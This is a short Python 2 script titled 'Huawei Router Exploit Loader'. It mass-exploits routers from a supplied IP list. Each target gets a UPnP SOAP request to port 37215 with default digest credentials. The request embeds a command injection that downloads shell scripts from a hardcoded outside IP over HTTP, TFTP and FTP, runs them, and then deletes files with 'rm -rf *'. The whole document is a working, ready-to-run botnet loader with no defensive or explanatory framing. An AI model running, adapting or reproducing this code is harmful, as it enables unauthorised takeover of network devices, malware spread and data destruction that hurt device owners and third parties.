#! python !#
 
# Huawei Router Exploit Loader 

import sys, os, re
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from decimal import *
 
ips = open(sys.argv[1], "r").readlines()
motherthreads = int(sys.argv[2])
motherthread_count = len(ips) / motherthreads
motherthread_chunks = [ips[x:x+motherthread_count] for x in xrange(0, len(ips), motherthread_count)]
cmd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.161/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.161 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.161; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.161 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
payload2 = "<?xml version=\"1.0\" ?>\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n    <NewStatusURL>$(" + cmd + ")</NewStatusURL>\n<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade>\n    </s:Body>\n    </s:Envelope>"
 
def dump(count):
    count = int(count)
    for i in motherthread_chunks[count]:
        try:
            url = "http://"+i+":37215/ctrlt/DeviceUpgrade_1"
            url = re.sub('\n', '', url)
            requests.post(url, timeout=8, data=payload2, auth=HTTPDigestAuth('dslf-config', 'admin'))
            print "PAYLOAD SENT %s"%(url)
            motherthread_chunks[count] = motherthread_chunks[count].remove(i)
        except:
            pass
 
for x in xrange(motherthreads):
    try:
        thread = Thread(target=dump, args=(x,))
        thread.start()
    except KeyboardInterrupt:
        sys.exit("STOPPING!!!")
    except:
        pass
